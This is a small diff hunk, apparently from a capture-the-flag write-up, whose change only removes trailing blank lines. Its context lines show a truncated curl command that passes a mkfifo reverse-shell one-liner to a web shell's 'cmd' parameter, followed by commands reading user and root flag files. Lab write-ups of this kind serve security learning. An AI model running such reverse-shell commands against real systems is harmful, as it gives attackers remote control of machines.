@@ -180,5 +180,3 @@ curl -k --get --data-urlencode "cmd=rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /b
 cat /home/rohit/user.txt
 cat /root/root.txt
 ```
-
-```
